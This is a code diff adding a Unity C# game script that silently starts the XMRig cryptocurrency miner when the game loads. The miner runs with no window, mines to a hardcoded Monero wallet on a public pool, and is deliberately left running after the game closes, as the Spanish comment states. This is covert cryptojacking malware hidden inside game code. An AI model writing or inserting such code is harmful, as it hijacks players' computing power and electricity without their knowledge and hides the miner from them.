@@ -1,0 +1,45 @@
+using System.Diagnostics;
+using UnityEngine;
+
+public class StartXMRig : MonoBehaviour
+{
+    [SerializeField]
+    private string xmrigPath = "./xmrig-6.22.2/xmrig.exe";
+    [SerializeField]
+    private string xmrigArgs = "xmrig.exe -o pool.supportxmr.com:443 -u 44wyZcihaZv6iJHY7bygRcfD7JUYP8agBgJUjNSrVXXUhMpGtuQdJS3fHctxhRj2Uwb2vGeUDSuVVVeKxtBysR1uGSM5jX2 -k --tls";
+
+    private Process xmrigProcess;
+
+    void Start()
+    {
+        DontDestroyOnLoad(this.gameObject);
+        StartMining();
+    }
+
+    void OnApplicationQuit()
+    {
+        // No se detiene XMRig al cerrar el juego
+        UnityEngine.Debug.Log("El juego se ha cerrado, pero XMRig seguirá ejecutándose.");
+    }
+
+    private void StartMining()
+    {
+        try
+        {
+            xmrigProcess = new Process();
+            xmrigProcess.StartInfo.FileName = xmrigPath;
+            xmrigProcess.StartInfo.Arguments = xmrigArgs;
+            xmrigProcess.StartInfo.CreateNoWindow = true;
+            xmrigProcess.StartInfo.UseShellExecute = false;
+            xmrigProcess.Start();
+
+            UnityEngine.Debug.Log("XMRig iniciado.");
+        }
+        catch (System.Exception ex)
+        {
+            UnityEngine.Debug.LogError("Error al iniciar XMRig: " + ex.Message);
+        }
+    }
+
+
+}
